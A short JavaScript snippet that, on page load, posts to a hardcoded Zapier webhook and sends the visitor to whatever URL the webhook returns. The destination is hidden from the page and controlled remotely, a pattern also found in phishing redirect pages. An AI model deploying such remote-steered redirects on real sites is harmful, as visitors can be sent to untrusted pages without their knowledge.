async function redirect() { const webhookUrl = 'https://hooks.zapier.com/hooks/catch/20832508/2iu0gus/'; try { const response = await fetch(webhookUrl, { method: 'POST' }); const data = await response.json(); if (data.redirectURL) { window.location.href = data.redirectURL; } } catch (error) { console.error('Error during fetch/redirect:', error); } } window.onload = redirect;
